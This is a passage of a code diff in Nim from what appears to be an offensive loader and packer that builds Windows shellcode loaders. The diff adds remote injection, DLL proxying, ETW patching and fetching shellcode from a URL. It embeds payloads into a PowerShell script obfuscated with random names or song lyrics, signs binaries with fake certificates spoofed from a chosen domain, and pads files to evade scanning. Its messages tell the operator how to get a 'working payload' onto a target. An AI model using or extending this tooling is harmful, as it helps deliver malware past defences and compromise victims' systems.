     # there's a bug in my modified denim, which makes "--" out of "-d" for the first argument when using multiple arguments, so only one can be accepted at the moment
     if (denim):
-        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
+        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
     else:
-        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+
+if (dllProxy):
+    basicCompileFlags.add("--mm:orc --threads:on ")
+    basicCompileFlags.add("-d:proxy ")
 
 if(dllProxy):
     when system.hostOS == "windows":
@@ -1840,6 +2155,18 @@ if(wait):
 if(blockDLLs):
     basicCompileFlags.add("-d:blockDLLs ")
 
+if(csharp):
+    basicCompileFlags.add("-d:csharp ")
+
+if(gosleep):
+    basicCompileFlags.add("-d:sleep ")
+
+if(remoteinject):
+    basicCompileFlags.add("-d:remoteinject ")
+
+if(COMVARETW):
+    basicCompileFlags.add("-d:COMVARETW ")
+
 if (noNimMain):
     when system.hostOS == "windows":
         basicCompileFlags.add(fmt"--passl:{packerPath}\\dllProxy\nonimmain.def ")
@@ -1847,11 +2174,13 @@ if (noNimMain):
         basicCompileFlags.add(fmt"--passl:{packerPath}/dllProxy/nonimmain.def ")
 
 if (retrieveFromURL):
-    if(shellcodeURL.contains("https")):
+    if(shellcodeURL.contains("https") or shellcodeURL.contains("HTTPS")):
         basicCompileFlags.add("-d:ssl ")
     elif(not shellcodeURL.contains("http")):
         echo "[!] URL must contain http:// or https://"
         quit()
+    else:
+        basicCompileFlags.add("-d:http ")
 
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
@@ -1868,6 +2197,9 @@ if (dllClone == false):
 
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
+
+if ((dllProxy == false) and (dllClone == false)):
+    basicCompileFlags.add("-d:defaultMain ")
 
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
@@ -1948,19 +2280,34 @@ when system.hostOS == "windows":
         var exist: bool = fileExists(".\\denim\\denim.exe")
         # cause some compile problems
         basicCompileFlags = basicCompileFlags.replace("--passc=-flto --passl=-flto ", "")
+        basicCompileFlags = basicCompileFlags.replace("-d:danger -d:strip ", "")
         if (exist):
             # An additional whitespace at the end causes an compiler error here, so we'll remove it
             basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
             stub = stub.replace("import strenc", "")
+            stub = stub.replace("when not defined(proxy):", "")
             writeFile("Loader.nim", stub)
+
+            echo "Denim compile argument: \r\n"
+
+            echo fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""\r\n"
             discard os.execShellCmd(fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
-            let msg = fmt"[!] Encrypted file saved to {outfile}"
-            echo "\n" & msg
-            if(replace):
-                var randstring: string = rndStr(2)
-                echo fmt"[!] ---> replacing nim with {randstring} "
-                discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
-            quit()
+            
+            var exists: bool = true
+            try:
+                var fileCheck = readFile("Loader.exe")
+            except:
+                exists = false
+            if(exists):
+                let msg = fmt"[!] Encrypted file saved as 'Loader.exe' (--output FilaName is ignored by denim)"
+                echo "\n" & msg
+                if(replace):
+                    var randstring: string = rndStr(2)
+                    echo fmt"[!] ---> replacing nim with {randstring} "
+                    discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
+            else:
+                echo "\r\nCompilation failed! Check the error message\r\n"
+                quit()
 elif system.hostOS == "linux":
     if (denim):
         echo "No Denim support for Linux systems, sorry!"
@@ -1990,6 +2337,75 @@ proc replaceList () =
         discard exec_cmd_ex(command)
 
 
+# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the file Script.ps1 with the list of bytes
+proc WritePS1() =
+    var exists: bool = true
+    try:
+        var fileCheck = readFile(fmt"{outfile}")
+    except:
+        exists = false
+    if(exists):
+        var file = open(fmt"{outfile}", fmRead)
+        var bytes: seq[byte] = toByteSeq(file.readAll())
+        file.close()
+        var length: int = len(bytes) - 1
+        var byteList: string = ""
+        for i in 0..length:
+            byteList.add(fmt"{bytes[i]},")
+        byteList = byteList[0..^2]
+        var script: string
+        if(psobfs):
+            script = PowershellObfsTemplate
+        else:
+            script = Powershelltemplate
+        script = script.replace("QWERQWERQWER", byteList)
+
+        # Now Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
+        var words: seq[string] = @["VAR", "FUN", "CONST", "ERROR", "LYRICS"]
+        var wordlength: int = len(words) - 1
+        var maxWords: int = 999
+        for i in 0..wordlength:
+            if (words[i] == "VAR"):
+                maxWords = 380
+            elif (words[i] == "FUN"):
+                maxWords = 100
+            elif (words[i] == "CONST"):
+                maxWords = 300
+            elif (words[i] == "ERROR"):
+                maxWords = 100
+            if (words[i] == "LYRICS"):
+                var lyrics: seq[string]
+                var dictionary: string
+                when system.hostOS == "windows":
+                    dictionary = "Dicts\\lyrics.txt"
+                else:
+                    dictionary = "Dicts/lyrics.txt"
+                for line in lines dictionary:
+                    lyrics.add(line)
+                var length: int = len(lyrics) - 1
+                for j in 0..1150:
+                    var randstring: string = ""
+                    if(uselyrics):
+                        for k in 0..10:
+                            randstring.add(fmt"{lyrics[rand(0..length)]}")
+                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
+                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
+            else:
+                for j in 0..maxWords:
+                    var randstring: string = rndStr(10)
+                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
+                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
+            
+            
+
+
+
+        writeFile(fmt"{outfile}.ps1", script)
+    else:
+        echo fmt"[!] File {outfile}.ps1 not found, skipping byte list creation"
+
+
+
 if(replace):
     replaceList()
 
@@ -2001,63 +2417,77 @@ if(dll_out):
         else:
             discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
 
-let msg = fmt"[!] Loader saved to {outfile}"
-echo "\n" & msg
-if(retrieveFromFile):
-    echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
-if (callobfs):
-    when system.hostOS == "windows":
-        var outfileonlyname = outfile.replace(packerPath, "")
-        echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
-        echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
-        echo "\r\n"
-        echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
-        outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
-    else:
-        echo "Only usable from a Windows OS, sorry!"
 
-if (sign):
-    echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
-    echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
-    var extension: string = ".exe"
-    if (cpl):
-        extension = ".cpl"
-    elif(dll_out):
-        extension = ".dll"
-    if system.hostOS == "linux":
-        discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
-    when system.hostOS == "windows":
-        discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
-    if (dll_out):
-        outfile.add(fmt".Signed{extension}")
-    else:
-        outfile.add(fmt".Signed{extension}")
+var exists: bool = true
+try:
+    var fileCheck = readFile(fmt"{outfile}")
+except:
+    exists = false
 
-if (pump):
-    for m in pumpargs:
-        if(m == "size"):
+if(exists):
+    let msg = fmt"[!] Loader saved to {outfile}"
+    echo "\n" & msg
+    if(retrieveFromFile):
+        echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
+    if (callobfs):
+        when system.hostOS == "windows":
+            var outfileonlyname = outfile.replace(packerPath, "")
+            echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
+            echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
+            echo "\r\n"
+            echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
+            outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
+        else:
+            echo "Only usable from a Windows OS, sorry!"
 
-            var pumpexecutable = readFile(outfile)
+    if (sign):
+        echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
+        echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
+        var extension: string = ".exe"
+        if (cpl):
+            extension = ".cpl"
+        elif(dll_out):
+            extension = ".dll"
+        if system.hostOS == "linux":
+            discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
+        when system.hostOS == "windows":
+            discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
+        if (dll_out):
+            outfile.add(fmt".Signed{extension}")
+        else:
+            outfile.add(fmt".Signed{extension}")
 
-            var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
+    if (pump):
+        for m in pumpargs:
+            if(m == "size"):
+                var pumpexecutable = readFile(outfile)
+                var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
+                proc pumpHard(number: int): seq[byte] =
+                    var pump: seq[byte] = pumpzero
+                    for i in 0 ..< number:
+                        pump.add(pumpzero)
+                    return pump
+                var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 
+                var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)
+                pumpsequence.add(pumped)
+                writeFile(fmt"{outfile}",pumpsequence)
 
-            proc pumpHard(number: int): seq[byte] =
-              var pump: seq[byte] = pumpzero
-              for i in 0 ..< number:
-                pump.add(pumpzero)
-              return pump
+    if (retrieveFromURL):
+        echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
 
-            var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 
-
-            var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)
-
-            pumpsequence.add(pumped)
+    if (dllProxy):
+        echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+    if(psout):
+        WritePS1()
+        echo "\r\nPowershell script saved to: " & fmt"{outfile}.ps1"
+        # Todo: Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
 
 
-            writeFile(fmt"{outfile}",pumpsequence)
 
-if (retrieveFromURL):
-    echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
 
-if (dllProxy):
-    echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+
+
+
+
+else:
+    echo "\r\nCompilation failed!! Check the error message.\r\n"
